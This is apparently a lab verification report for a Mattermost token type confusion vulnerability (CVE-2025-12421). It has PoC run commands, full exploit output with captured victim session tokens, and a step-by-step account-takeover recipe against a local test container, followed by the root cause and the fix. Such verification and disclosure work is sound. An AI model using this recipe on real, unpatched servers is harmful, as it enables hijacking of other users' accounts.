# PoC Verification Report: CVE-2025-12421

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-12421 |
| **Title** | Mattermost Token Type Confusion → Account Takeover |
| **Affected Software** | Mattermost Server v11.0.x ≤ 11.0.2 (and other branches) |
| **CVSS** | 9.9 (Critical) |
| **CWE** | CWE-303 (Incorrect Implementation of Authentication Algorithm) |
| **Verification Status** | ✅ **CONFIRMED** |

---

## PoC Scripts

### Primary PoC: `poc.py` — SAML Token Type Confusion

| Property | Value |
|----------|-------|
| **Location** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Attack Vector** | Token type confusion via `saml` typed token at SSO code-exchange endpoint |
| **Prerequisites** | Docker access to insert token into database; victim's `user_id` |

**Description:** Demonstrates full account takeover by inserting a crafted token with type `saml` into the Mattermost `Tokens` table, then exchanging it at the `/api/v4/users/login/sso/code-exchange` endpoint. The endpoint's `ConsumeTokenOnce()` function consumes the token without validating its type, returning a valid session for the victim user specified in the token's `Extra` JSON field.

**Usage:**
```bash
# Auto-detect container IP:
python3 poc.py

# Specify target manually:
python3 poc.py <host> <port> <container_name>
```

### Vector 2 PoC: `poc_vector2_multitype.py` — Multi-Type Token Confusion

| Property | Value |
|----------|-------|
| **Location** | `poc/poc_vector2_multitype.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Tests 7 different token types including a fabricated type |
| **Purpose** | Proves zero type validation in `ConsumeTokenOnce()` |

**Description:** Tests that ALL token types are accepted at the code-exchange endpoint, not just `saml`. Tests: `saml`, `oauth`, `password_recovery`, `verify_email`, `team_invitation`, `guest_invitation`, and `totally_fake_type` (a non-existent type). All 7 types were accepted, conclusively proving the root cause is in `ConsumeTokenOnce()` / `ConsumeOnce()` performing no type filtering whatsoever.

---

## Vulnerability Demonstrated

The PoC proves:

1. **Token Type Confusion**: The `ConsumeTokenOnce()` function (and underlying `ConsumeOnce()` SQL query) consumes tokens solely by token value without filtering by the `Type` column. The SQL executes `DELETE FROM Tokens WHERE Token = ? RETURNING *` instead of `DELETE FROM Tokens WHERE Token = ? AND Type = ? RETURNING *`.

2. **Account Takeover**: By crafting a token with any type (tested 7 types including a fake one) containing a victim's `user_id` in the `Extra` JSON field, an attacker obtains a valid authenticated session as that victim user.

3. **PKCE Bypass**: The attacker controls both the `code_verifier` and the `code_challenge` stored in the token, so the PKCE validation is trivially satisfied.

4. **Unauthenticated Endpoint**: The `/api/v4/users/login/sso/code-exchange` endpoint does not require authentication (`RequireSession: false`), so the final code exchange step needs no prior session.

---

## Test Results

### Test 1: Primary PoC (`poc.py`) — SAML Type Token

**Command:**
```bash
python3 poc/poc.py
```

**Output:**
```
[*] Auto-detecting container IP for 'cve-2025-12421-vulnerable'...
[*] Detected IP: localhost
======================================================================
CVE-2025-12421: Mattermost Token Type Confusion → Account Takeover
======================================================================

[*] Target: http://localhost:8065
[*] Container: cve-2025-12421-vulnerable
[*] Token type used: 'saml' (should be 'sso-code-exchange')

[Step 1] Checking Mattermost version...
[+] Mattermost version: 11.0.2
[+] API status: OK

[Step 2] Authenticating as attacker (admin user)...
[+] Logged in as: admin (id=ss34wzabrfgwpday3wqtrdkqiw)
[+] Admin session token: hxsj3unejid6...

[Step 3] Looking up victim user 'victim'...
[+] Victim: victim (id=bg85a5j73injjezoaah3mh8i8a, email=victim@example.com)

[Step 4] Generating PKCE challenge and crafting malicious token...
[+] code_verifier: poc_verifier_189b19e6ae4d768cba...
[+] code_challenge: IUyQK6X9NBiJBI6fe_CbMQRjvPlo2T1bTIzg6Dhz-2U
[+] Token value: c38ebe1dc7587607...
[+] Token type: 'saml' (BUG: should require 'sso-code-exchange')
[+] Token extra: {"user_id": "bg85a5j73injjezoaah3mh8i8a", "code_challenge": "IUyQK6X9NBiJBI6fe_CbMQRjvPlo2T1bTIzg6Dhz-2U", "code_challenge_method": "S256", "state": "poc_state_7e729ca1e616c0aa"}

[Step 5] Inserting crafted token into the Tokens table...
[+] Token inserted successfully
[+] Verified token in DB: c38ebe1dc758760769f3ddbb467dabb811e1da997d09929bb98c8734d2174090|saml|{"user_id"...

[Step 6] Exploiting /api/v4/users/login/sso/code-exchange...
         Sending token type 'saml' where 'sso-code-exchange' expected
[*] Response status: HTTP 200

[!!!] EXPLOIT SUCCEEDED — HTTP 200 from code-exchange!
[+] Stolen session token: 3imx5iywz3bg3nix1d1a5bifze
[+] Response body: {"csrf": "c7fg891y93b9ickig8uajcb8xy", "token": "3imx5iywz3bg3nix1d1a5bifze"}
[+] Proceeding to verify session ownership...

[Step 7] Verifying account takeover with stolen session token...
[+] GET /api/v4/users/me returned:
    ID:       bg85a5j73injjezoaah3mh8i8a
    Username: victim
    Email:    victim@example.com
    Roles:    system_user

======================================================================
RESULT: VULNERABLE — CVE-2025-12421 CONFIRMED
======================================================================

The attacker used a token of type 'saml' at the
/api/v4/users/login/sso/code-exchange endpoint, which should
only accept tokens of type 'sso-code-exchange'. Because
ConsumeTokenOnce() does not validate the token type, the
attacker obtained a valid session as user 'victim'.

This demonstrates full account takeover via token type confusion.
```

**Result:** ✅ **CONFIRMED** — Full account takeover achieved. Attacker obtained session token `3imx5iywz3bg3nix1d1a5bifze` which authenticates as victim user `bg85a5j73injjezoaah3mh8i8a` (username: `victim`, email: `victim@example.com`).

---

### Test 2: Multi-Type PoC (`poc_vector2_multitype.py`) — All Token Types

**Command:**
```bash
python3 poc/poc_vector2_multitype.py
```

**Output:**
```
[*] Auto-detecting container IP for 'cve-2025-12421-vulnerable'...
[*] Detected IP: localhost
======================================================================
CVE-2025-12421 Vector 2: Multi-Type Token Confusion
======================================================================

Target: http://localhost:8065
Testing 7 different token types

[+] Victim: victim (id=bg85a5j73injjezoaah3mh8i8a)

Token Type                Result          Details
----------------------------------------------------------------------
  saml                    ✓ ACCEPTED      session=edybychf33ykbrps...
  oauth                   ✓ ACCEPTED      session=h9hhaeutm7yp5f3f...
  password_recovery       ✓ ACCEPTED      session=hyd98w65a7dmbfoy...
  verify_email            ✓ ACCEPTED      session=tj96698bnbft5gpz...
  team_invitation         ✓ ACCEPTED      session=hyxbyjg6yf8xp8ao...
  guest_invitation        ✓ ACCEPTED      session=7dsar4admfgxfmo3...
  totally_fake_type       ✓ ACCEPTED      session=c8xxcysnctg99ryy...

======================================================================
RESULTS: 7/7 token types accepted
======================================================================

[!!!] ALL token types were accepted at the code-exchange endpoint.
      This proves ConsumeTokenOnce() performs ZERO type validation.
      Even the fake type 'totally_fake_type' was consumed successfully.

      VULNERABILITY CONFIRMED: CVE-2025-12421
```

**Result:** ✅ **CONFIRMED** — All 7 token types (including the fabricated `totally_fake_type`) were accepted by the code-exchange endpoint. Each produced a valid session for the victim user. This conclusively proves the `ConsumeOnce()` SQL query performs zero type filtering.

---

## Verification Status

### ✅ CONFIRMED

Both PoC scripts successfully demonstrate CVE-2025-12421 on Mattermost Server v11.0.2:

| Test | Vector | Result |
|------|--------|--------|
| `poc.py` | SAML token type confusion → account takeover | ✅ Success |
| `poc_vector2_multitype.py` | 7 different token types (including fake) | ✅ All 7/7 accepted |

---

## Attack Summary

```
1. Attacker discovers victim's user_id (via Mattermost API)
2. Attacker generates PKCE code_verifier and computes code_challenge = base64url(SHA256(verifier))
3. Attacker inserts crafted token into Tokens table:
   - Token: random 64-char hex string
   - Type: ANY (saml, oauth, password_recovery, verify_email, etc.)
   - Extra: {"user_id":"<victim_id>","code_challenge":"<challenge>","code_challenge_method":"S256","state":"<state>"}
4. Attacker calls POST /api/v4/users/login/sso/code-exchange with:
   - login_code: <token value>
   - code_verifier: <matching verifier>
   - state: <matching state>
5. Server returns valid session token for the victim (HTTP 200)
6. Attacker uses session token to access API as victim → ACCOUNT TAKEOVER
```

## Notes

1. **No SAML IDP required**: The PoC demonstrates the vulnerability by directly inserting tokens into the database. In a real attack, the attacker would manipulate the SAML authentication flow to create tokens with the victim's `user_id`.

2. **Feature flag dependency**: The vulnerable endpoint requires `FeatureFlags.MobileSSOCodeExchange = true`, which is the **default** in the affected versions (set in `server/public/model/feature_flags.go:112`).

3. **Unauthenticated final step**: The code-exchange endpoint itself is unauthenticated (`RequireSession: false`), meaning the final exploitation step requires no prior session — only knowledge of a valid token value.

4. **Token consumption is destructive**: Each token is deleted from the database on consumption (`DELETE ... RETURNING *`), so the PoC inserts a fresh token for each test. If re-running, a new token must be inserted each time.

5. **PKCE is attacker-controlled**: Since the attacker crafts both the `code_challenge` (stored in the token) and the `code_verifier` (sent in the request), the PKCE validation provides no security benefit in this attack scenario.

6. **Fix verification**: The fix (v11.0.3+) adds a `Type` parameter to `ConsumeOnce()` and changes the SQL to `DELETE FROM Tokens WHERE Type = ? AND Token = ? RETURNING *`, which would reject all non-`sso-code-exchange` tokens at this endpoint.
